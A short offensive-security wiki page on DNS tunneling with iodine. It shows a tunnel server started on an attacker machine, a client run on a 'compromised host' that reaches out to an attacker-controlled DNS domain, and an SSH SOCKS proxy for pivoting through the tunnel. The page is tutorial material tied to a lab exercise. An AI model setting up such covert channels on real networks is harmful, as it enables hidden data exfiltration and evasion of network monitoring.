# DNS Tunneling

## Theory

DNS Tunneling also known as **TCP over DNS**, where an attacker encapsulates other protocols, such as HTTP requests, over the DNS protocol using the [DNS Data Exfiltration technique](../exfiltration/dns.md). DNS Tunneling establishes a communication channel where data is sent and received continuously.

## Practice
{% tabs %}
{% tab title="iodine" %}
[iodine](https://github.com/yarrick/iodine) is a C software that lets you tunnel IPv4 data through a DNS server.  
On the attacking machine we can run the server:
```bash
v4resk@kali$ sudo iodined -f -c -P password 10.1.1.1/24 my.dnsServer.com    
```
On the compromised host, the jumpbox, we will setup the iodine client:
```bash
victim@pwnd.lab$ sudo iodine -P password my.dnsServer.com     
```
Now the attacking machine and the compromised host are sending traffics throught the `dns0` interface. All communication over this interface on the network 10.1.1.1/24 will be over the DNS. We can then setup a socks5 proxy using the `-D` argument of ssh client. 
```bash
veresk@kali$ ssh victim@10.1.1.2 -4 -D 1080 -Nf
```
{% endtab %}
{% endtabs %}

## Resources
{% embed url="https://tryhackme.com/room/dataxexfilt" %}